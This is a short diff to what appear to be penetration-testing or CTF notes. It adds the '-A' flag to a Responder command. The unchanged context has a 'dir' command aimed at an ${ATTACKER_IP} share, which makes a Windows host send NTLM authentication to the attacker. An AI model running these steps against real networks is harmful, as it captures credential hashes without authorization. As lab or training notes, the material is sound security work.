@@ -123,7 +123,7 @@ If the user is in Remote Desktop Users, we are good.
 On kali, set up responder on the network interface (usually `tun0`):
 
 ```
-sudo responder -I tun0
+sudo responder -I tun0 -A
 ```
 
 Now, from the Windows shell, do something like `dir \\${ATTACKER_IP}\thiswillgetdenied`.
